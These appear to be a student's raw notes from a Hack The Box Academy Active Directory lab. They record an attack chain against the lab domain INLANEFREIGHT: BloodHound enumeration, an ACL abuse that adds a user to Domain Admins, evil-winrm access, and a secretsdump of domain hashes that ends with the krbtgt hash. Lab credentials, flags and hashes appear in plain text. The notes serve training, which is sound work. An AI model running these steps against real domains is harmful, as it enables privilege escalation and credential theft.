HTB_@cademy_stdnt!
upload SharpHound.exe
.\SharpHound.exe -c All --zipfilename ILFREIGHT
--> Failed

$sid = Convert-NameToSid CT059
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

proxychains secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/CT059@172.16.7.3
charlie1
--> Failed

proxychains xfreerdp /u:CT059 /p:"charlie1" /v:172.16.7.50
--> OK

On Linux pivot :
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /home/htb-student/ -user test -password test

On MS01 172.16.7.50 :
net use n: \\172.16.7.240\share /user:test test
The command completed successfully.

copy n:\SharpHound.exe
.\SharpHound.exe -c All --zipfilename ILFREIGHT


copy C:\Users\CT059\20231217034416_ILFREIGHT.zip n:\

python3 -m http.server
wget $TARGET:8000/20231217034416_ILFREIGHT.zip

sudo neo4j start
bloodhound
http://localhost:7474
neo4j
neo4j

.\SharpView.exe Get-DomainUser -Identity CT059

Get-DomainGroupMember -Identity "Domain Admins" | Select MemberName
MemberName
----------
Administrator

$SecPassword = ConvertTo-SecureString 'charlie1' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\CT059', $SecPassword) 

Adding damundsen to the Help Desk Level 1 Group
Get-ADGroup -Identity "Domain Admins" -Properties * | Select -ExpandProperty Members
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CT059' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'CT059' to group 'Domain Admins'


MemberName
----------
CT059
Administrator


proxychains xfreerdp /u:CT059 /p:"charlie1" /v:172.16.7.3
--> Failed
proxychains evil-winrm -i 172.16.7.3 -u CT059 -p charlie1

*Evil-WinRM* PS C:\Users\CT059\Documents> type c:\Users\Administrator\Desktop\flag.txt
acLs_f0r_th3_w1n!

proxychains secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/CT059@172.16.7.3
charlie1

cat inlanefreight_hashes.ntds | grep krbtgt
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
